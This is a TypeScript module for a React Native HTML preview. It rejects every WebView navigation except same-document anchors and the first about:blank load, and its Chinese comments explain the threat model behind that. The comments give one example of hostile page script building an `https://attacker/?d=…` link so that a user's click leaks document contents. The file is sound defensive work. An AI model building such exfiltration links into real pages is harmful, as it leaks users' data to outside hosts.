/**
 * HTML 预览的导航策略 —— **纯函数,不依赖 react-native**。
 *
 * 单独成模块的理由与 htmlPreviewCsp 相同:这是可单测的判定逻辑,而 HtmlFileReader 是载体。
 * 放在载体里会让契约用例为了 import 它把整个 react-native 拉进 node 环境(Flow 语法,解析
 * 直接失败),于是只能退化成读源码字符串的守卫 —— 而这条策略值得**行为级**用例。
 */
import type { ShouldStartLoadRequest } from 'react-native-webview/lib/WebViewTypes';

/**
 * 唯一的导航决策点(originWhitelist 已放到 `['*']`,所有请求都会先到这里)。
 *
 * 两档,默认拒绝:
 *  - **同文档锚点** `about:blank#…` —— 不替换文档,CSP 与能力剥离都还在,放行(目录跳转靠它);
 *  - **首份文档自身的加载**(`about:blank` / 空 url),仅在上闩之前;
 *  - **其余一切** —— 拒绝,且**不调 Linking**(不 import 它,守卫用例钉住)。
 *
 * ── 为什么不能放行整个 `about:*`(review P1) ────────────────────────────────
 * 早先这里对整个 `about:` scheme 前缀一律放行(用的是 startsWith 前缀判定)。那意味着页面可以把自己导航到
 * `about:blank`,而**新文档不会再经过 withHtmlPreviewCsp** —— CSP meta 与能力剥离脚本都是
 * 拼在那份 HTML 字符串里的,换了文档就都没了,iOS 侧的原生 `RTCPeerConnection` 因此复活。
 * 所以改成:同文档锚点放行(不替换文档,加固仍在),首份文档加载放行一次,之后**任何**
 * 替换文档的导航都拒绝。闩在 `onLoadEnd` 上,换 html 时随组件 key 重置。
 *
 * ⚠️ 已知残留(如实记录,不夸大修复范围):闩在**首份文档加载完成**时才合上,所以理论上
 * 存在「解析期间的内联脚本抢在 onLoadEnd 之前把文档导航到 about:blank」这一次机会。它的
 * 后果有限 —— 那个空白文档里没有作者脚本可执行(导航会销毁原文档的 JS 上下文),要利用它
 * 还需要一条能在新文档里跑代码的通道,而 window.open 与 iframe 分别被
 * setSupportMultipleWindows={false} 与 CSP `frame-src 'none'` 封住。彻底闭合需要在原生层
 * 拒绝文档级导航,属独立改动。
 *
 * ── 为什么连「用户点击的 http(s) 外链」也不放(review P1,曾经放过) ──────────
 * 页面里的 JavaScript 是开启的(CSP 允许 `script-src 'unsafe-inline'`,不然自包含产物的
 * 交互全废),而作者脚本能读到整份文档 —— 包括栈上一层内联进来的同目录资源字节。它可以把
 * 这些内容拼进一个真实的 `<a href="https://attacker/?d=…">`(甚至铺一层全屏透明覆盖层),
 * 用户随手一点就命中 `navigationType === 'click'`——数据在用户看见浏览器之前就已经发出去了。
 *
 * **CSP 挡不住这条**:它管子资源与表单(`connect-src` / `img-src` / `form-action`),
 * 顶层导航不在其控制范围内(`navigate-to` 指令已从 CSP3 移除,两端都不实现)。所以
 * 「点击门」只能挡住程序化导航,挡不住脚本**构造出的、由用户点击触发**的 URL。
 *
 * 两条候选补救都不划算:
 *  - **弹确认框**:要用户对着一条 2KB base64 的 URL 判断安全性,是安全剧场;
 *  - **静态 href 白名单**(只放原文里字面存在的 URL):挡得住,但要引入 URL 归一化
 *    (HTML 实体、百分号编码、尾斜杠),归一化对不上就变成「合法外链静默点不开」。
 * 而这条能力**本来就只在 iOS 上存在** —— Android 侧 RNW 的 `createWebViewEvent` 根本不设
 * `navigationType`,那边一直拿不准、一直是拒绝。删掉它是把两端对齐,不是砍掉一个统一功能。
 *
 * 与本 PR 已经接受的取舍也一致:CSP 让公网 https 图片 / 字体在预览里不加载,预览本就不联网;
 * 在那个前提下还留一条**用户可触发**的外送信道没有道理。外链的退路是工具栏「分享」把文件
 * 送到电脑或浏览器里打开,或切「源码」态自己看 URL。
 */
export function interceptHtmlNavigation(
  request: ShouldStartLoadRequest,
  documentSettled: boolean,
): boolean {
  const url = request.url ?? '';
  // 同文档锚点(`about:blank#toc`):不替换文档,策略与能力剥离都还在,放行 —— 目录跳转靠它。
  if (/^about:blank#/i.test(url)) return true;
  // 首份文档自身的加载。上闩之后**不再放行**,包括 `about:blank`。
  if (!documentSettled && (url === '' || url === 'about:blank')) return true;
  return false;
}
